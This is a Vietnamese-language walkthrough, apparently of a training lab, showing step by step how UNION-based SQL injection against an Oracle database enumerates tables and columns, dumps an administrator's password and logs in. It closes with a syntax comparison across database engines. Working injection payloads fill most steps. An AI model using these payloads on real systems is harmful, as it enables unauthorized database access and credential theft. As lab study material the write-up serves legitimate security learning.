# Lab 10 - SQL injection attack, listing the database contents on Oracle

## Mục tiêu
Khai thác lỗ hổng SQLi trong tham số `category` để liệt kê bảng, cột, sau đó lấy được username/password của user `administrator` và đăng nhập thành công.

---

## Bước 1 — Xác định số cột của câu truy vấn gốc

**Payload dùng:**
```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
```

**Cách làm:** Tăng dần số sau `ORDER BY` cho tới khi server trả lỗi (Internal Server Error). Số cuối cùng còn chạy được (không lỗi) chính là số cột thật của bảng gốc.

**Kết quả:**
```
3 - 1 = 2
```
→ `ORDER BY 3` bị lỗi, `ORDER BY 2` vẫn chạy được → bảng gốc có **2 cột**.

---

## Bước 2 — Xác định kiểu dữ liệu của từng cột (có phải kiểu text không)

**Payload dùng:**
```sql
' UNION SELECT 'a', 'a' FROM DUAL--
```

**Giải thích:** Vì đây là Oracle, mọi câu `SELECT` bắt buộc phải có `FROM`, kể cả khi không cần lấy dữ liệu từ bảng thật nào. Oracle cung cấp sẵn bảng ảo tên `DUAL` chỉ để phục vụ việc này — đây là điểm khác biệt lớn nhất so với MySQL/PostgreSQL (2 hệ đó không bắt buộc có `FROM`).

**Kết quả:**
- Payload chạy thành công, không lỗi 500
- → Xác nhận: đây là **cơ sở dữ liệu Oracle**
- → Cả 2 cột đều **chấp nhận kiểu dữ liệu text** (vì `'a'` – chuỗi ký tự – chèn vào được cả 2 vị trí mà không báo lỗi kiểu dữ liệu)

---

## Bước 3 — Liệt kê danh sách bảng trong database

**Payload dùng:**
```sql
' UNION SELECT table_name, NULL FROM all_tables--
```

**Giải thích:** Oracle lưu danh sách toàn bộ bảng trong bảng hệ thống `all_tables` (khác với MySQL/Postgres dùng `information_schema.tables`). Cột `table_name` chứa tên từng bảng. Cột thứ 2 để `NULL` vì ta chỉ cần xem tên bảng, không cần thêm dữ liệu gì khác — nhưng vẫn phải giữ đúng 2 cột để khớp với số cột đã xác định ở Bước 1.

**Kết quả:**
```
USERS_OVTMUR
```
→ Tìm thấy bảng chứa thông tin đăng nhập, tên bảng có hậu tố ngẫu nhiên là `OVTMUR`.

---

## Bước 4 — Liệt kê tên các cột trong bảng `USERS_OVTMUR`

**Payload dùng:**
```sql
' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name = 'USERS_OVTMUR'--
```

**Giải thích:** Oracle lưu thông tin cột của mọi bảng trong bảng hệ thống `all_tab_columns` (tương đương `information_schema.columns` ở MySQL/Postgres). Thêm điều kiện `WHERE table_name = '...'` để chỉ lọc ra cột của đúng bảng `USERS_OVTMUR` vừa tìm được ở Bước 3, tránh liệt kê lẫn cột của các bảng khác trong hệ thống.

**Kết quả:**
```
USERNAME_AIXDER
PASSWORD_PBOBJP
```
→ Xác định được 2 cột cần: cột lưu username và cột lưu password.

---

## Bước 5 — Truy xuất toàn bộ username và password

**Payload dùng:**
```sql
' UNION SELECT USERNAME_AIXDER, PASSWORD_PBOBJP FROM USERS_OVTMUR--
```

**Giải thích:** Giờ đã biết đúng tên bảng và tên 2 cột, chỉ cần SELECT trực tiếp 2 cột đó từ bảng `USERS_OVTMUR` để lấy toàn bộ dữ liệu tài khoản, không cần dò qua `all_tables`/`all_tab_columns` nữa.

**Kết quả:**
```
administrator : 62ff70j1grr54tgsgo3w
```
→ Tìm được dòng có username là `administrator`, password tương ứng là `62ff70j1grr54tgsgo3w`.

---

## Bước 6 — Đăng nhập

Dùng cặp thông tin vừa lấy được:
- **Username:** `administrator`
- **Password:** `62ff70j1grr54tgsgo3w`

Đăng nhập vào trang lab → hoàn thành bài (trạng thái lab chuyển từ "Not solved" sang "Solved").

---

## Bảng so sánh nhanh: Oracle vs MySQL/PostgreSQL

Ghi lại để không nhầm lẫn khi chuyển qua làm lab trên hệ cơ sở dữ liệu khác.

| Việc cần làm | Oracle | MySQL / PostgreSQL |
|---|---|---|
| SELECT không cần lấy từ bảng thật | Bắt buộc thêm `FROM DUAL` | Không cần `FROM` |
| Lấy version của DB | `SELECT banner FROM v$version` | `SELECT @@version` (MySQL) hoặc `version()` (Postgres) |
| Liệt kê danh sách bảng | `FROM all_tables` | `FROM information_schema.tables` |
| Liệt kê danh sách cột | `FROM all_tab_columns WHERE table_name = '...'` | `FROM information_schema.columns WHERE table_name = '...'` |

---

## Những lỗi đã gặp và cách tránh (rút kinh nghiệm từ lab trước)

1. **Luôn viết payload dạng plain text (chưa encode) trước**, sau đó bôi đen và bấm **Ctrl+U đúng 1 lần** để URL-encode. Bấm Ctrl+U 2 lần liên tiếp sẽ gây double-encode (VD: dấu cách bị encode 2 lớp thành `%252b` thay vì `%20`), khiến server không parse đúng cú pháp SQL → lỗi 500.

2. **Không viết lặp tên bảng trong mệnh đề FROM**, ví dụ sai: `FROM all_tables, all_tables` — chỉ cần viết đúng 1 lần `FROM all_tables`. Viết lặp sẽ khiến SQL hiểu nhầm thành join 2 bảng, gây lỗi cú pháp.

3. **Số cột trong UNION SELECT phải khớp chính xác** với số cột đã xác định ở Bước 1 (trong lab này là 2 cột). Nếu dùng `SELECT *` để lấy toàn bộ cột từ `all_tables`/`all_tab_columns` sẽ bị sai số cột (vì các bảng hệ thống này có rất nhiều cột), cần luôn chỉ định rõ đúng 2 cột cần lấy, cột thừa điền `NULL`.